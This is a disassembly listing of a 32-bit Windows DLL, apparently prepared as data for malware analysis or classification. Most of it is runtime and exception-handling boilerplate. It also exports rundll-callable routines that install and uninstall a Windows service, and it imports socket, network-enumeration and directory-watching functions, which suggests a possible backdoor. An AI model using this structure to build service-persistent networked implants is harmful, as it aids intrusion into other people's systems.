mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
cmp [ eax ] 0xe06d7363
je r-xdata
call ?terminate@@YAXXZ
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_71005981
retn 0x10
mov [ ebp - 0x24 ] 0x0
mov eax [ ebp - 0x24 ]
retn
sub_71006099
push 0xc
push r--data
call sub_7100593c
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0xc ]
mov eax esi
imul eax [ ebp + 0x10 ]
add [ ebp + 0x8 ] eax
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x4 ] 0xfffffffe
call sub_710060e4
call sub_71005981
retn 0x10
sub [ ebp + 0x8 ] esi
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_71006108
push 0x14
push r--data
call sub_7100593c
push [ rw-data ]
mov esi [ _decode_pointer@IAT ]
call esi
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
push 0x8
call _lock
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
call esi
mov [ ebp - 0x1c ] eax
push [ rw-data ]
call esi
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x8 ]
call __dllonexit
mov [ ebp - 0x24 ] eax
push [ ebp - 0x1c ]
mov esi [ _encode_pointer@IAT ]
call esi
mov [ rw-data ] eax
push [ ebp - 0x20 ]
call esi
add esp 0x1c
mov [ rw-data ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_7100619e
mov eax [ ebp - 0x24 ]
push [ ebp + 0x8 ]
call [ _onexit@IAT ]
pop ecx
jmp r-xdata
call sub_71005981
retn
sub_710061b9
push esi
push edi
mov eax r--data
mov edi r--data
cmp eax edi
mov esi eax
jae r-xdata
pop edi
pop esi
retn
mov eax [ esi ]
test eax eax
je r-xdata
add esi 0x4
cmp esi edi
jb r-xdata
call eax
sub_710061dd
push esi
push edi
mov eax r--data
mov edi r--data
cmp eax edi
mov esi eax
jae r-xdata
pop edi
pop esi
retn
mov eax [ esi ]
test eax eax
je r-xdata
add esi 0x4
cmp esi edi
jb r-xdata
call eax
sub_71006210
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0x5a4d
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
retn
xor ecx ecx
cmp [ eax + 0x18 ] 0x10b
sete cl
mov eax ecx
retn
sub_71006240
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
test esi esi
push edi
lea eax [ eax + ecx + 0x18 ]
jbe r-xdata
xor eax eax
mov edi [ esp + 0x14 ]
add edx 0x1
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
retn
sub_71006282
push 0x8
push r--data
call sub_7100593c
and [ ebp - 0x4 ] 0x0
mov edx __dos_header
push edx
call sub_71006210
pop ecx
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov eax [ ebp + 0x8 ]
sub eax edx
push eax
push edx
call sub_71006240
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
call sub_71005981
retn
sub_71006306
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
cmp eax edi
mov ebx 0xffff0000
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_71001f0a
mov eax [ ebp - 0x38 ]
xor ebx ebx
cmp eax ebx
je r-xdata
mov eax r-xdata
retn
cmp [ eax ] bl
je r-xdata
call [ GetLastError@IAT ]
RundllInstallA
push [ esp + 0xc ]
call InstallService
retn 0x10
sub_71003405
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
xor eax eax
inc eax
retn
RundllUninstallA
push [ esp + 0xc ]
call UninstallService
retn 0x10
strcpy
jmp [ strcpy@IAT ]
strcat
jmp [ strcat@IAT ]
memset
jmp [ memset@IAT ]
sub_71005920
cmp ecx [ rw-data ]
jne r-xdata
jmp sub_71005e73
retn
??2@YAPAXI@Z
jmp [ operator new@IAT ]
sub_71005981
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_71005995
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push sub_71005920
push rw-data
call _except_handler4_common
add esp 0x18
retn
strlen
jmp [ strlen@IAT ]
abs
jmp [ abs@IAT ]
sub_71005a00
cmp [ rw-data ] 0x0
je sub_71005a36
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff8
fstp [ esp ]
cvttsd2si eax [ esp ]
leave
retn
memcpy
jmp [ memcpy@IAT ]
__CxxFrameHandler3
jmp [ __CxxFrameHandler3@IAT ]
_CxxThrowException
jmp [ _CxxThrowException@IAT ]
memcmp
jmp [ memcmp@IAT ]
??_U@YAPAXI@Z
jmp [ operator delete[]@IAT ]
??_V@YAXPAX@Z
jmp [ `placement delete closure'@IAT ]
sub_71005e13
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x20 ] ecx
push eax
push ecx
call __CppXcptFilter
pop ecx
pop ecx
retn
sub_71005e47
mov [ rw-data ] 0xffffffff
retn
_start
cmp [ esp + 0x8 ] 0x1
jne r-xdata
push [ esp + 0x4 ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
call sub_71005d3c
pop ecx
retn 0xc
call sub_71006306
_except_handler4_common
jmp [ _except_handler4_common@IAT ]
sub_71005f7e
push 0xc
push r--data
call sub_7100593c
and [ ebp - 0x4 ] 0x0
movapd xmm0 xmm1
mov [ ebp - 0x1c ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_71005981
retn
sub_71005f9b
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_7100602e
call sub_71005fce
mov [ rw-data ] eax
xor eax eax
retn
sub_710060e4
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
retn
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_7100603b
sub_710060fc
push rw-data
call __clean_type_info_names_internal
pop ecx
retn
sub_7100619e
push 0x8
call _unlock
pop ecx
retn
sub_710061a7
push [ esp + 0x4 ]
call sub_71006108
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
retn
sub_710062c8
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
xor ecx ecx
cmp eax 0xc0000005
sete cl
mov eax ecx
retn
_initterm
jmp [ _initterm@IAT ]
_initterm_e
jmp [ _initterm_e@IAT ]
_amsg_exit
jmp [ _amsg_exit@IAT ]
__CppXcptFilter
jmp [ __CppXcptFilter@IAT ]
_crt_debugger_hook
jmp [ _crt_debugger_hook@IAT ]
?terminate@@YAXXZ
jmp [ terminate@IAT ]
?_type_info_dtor_internal_method@type_info@@QAEXXZ
jmp [ type_info::_type_info_dtor_internal_method@IAT ]
__clean_type_info_names_internal
jmp [ __clean_type_info_names_internal@IAT ]
_unlock
jmp [ _unlock@IAT ]
__dllonexit
jmp [ __dllonexit@IAT ]
_lock
jmp [ _lock@IAT ]
closesocket
jmp [ closesocket@IAT ]
shutdown
jmp [ shutdown@IAT ]
send
jmp [ send@IAT ]
__WSAFDIsSet
jmp [ __WSAFDIsSet@IAT ]
select
jmp [ select@IAT ]
recv
jmp [ recv@IAT ]
connect
jmp [ connect@IAT ]
inet_addr
jmp [ inet_addr@IAT ]
htons
jmp [ htons@IAT ]
socket
jmp [ socket@IAT ]
gethostname
jmp [ gethostname@IAT ]
inet_ntoa
jmp [ inet_ntoa@IAT ]
WSACleanup
jmp [ WSACleanup@IAT ]
gethostbyname
jmp [ gethostbyname@IAT ]
WSAStartup
jmp [ WSAStartup@IAT ]
NetApiBufferFree
jmp [ NetApiBufferFree@IAT ]
NetServerEnum
jmp [ NetServerEnum@IAT ]
GetSystemPowerStatus
jmp [ GetSystemPowerStatus@IAT ]
ReadDirectoryChangesW
jmp [ ReadDirectoryChangesW@IAT ]
sub_71006436
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_71005920
mov ecx [ edx + 0x200 ]
xor ecx eax
call sub_71005920
mov eax r--data
jmp __CxxFrameHandler3
sub_7100645e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_71005920
mov ecx [ edx + 0x200 ]
xor ecx eax
call sub_71005920
mov eax r--data
jmp __CxxFrameHandler3
sub_71006486
lea ecx [ ebp - 0x2624 ]
jmp sub_71001572
sub_71006491
lea ecx [ ebp - 0x2618 ]
jmp sub_71001572
sub_7100649c
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2664 ]
mov ecx [ edx - 0x2668 ]
xor ecx eax
call sub_71005920
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_71005920
mov eax r--data
jmp __CxxFrameHandler3
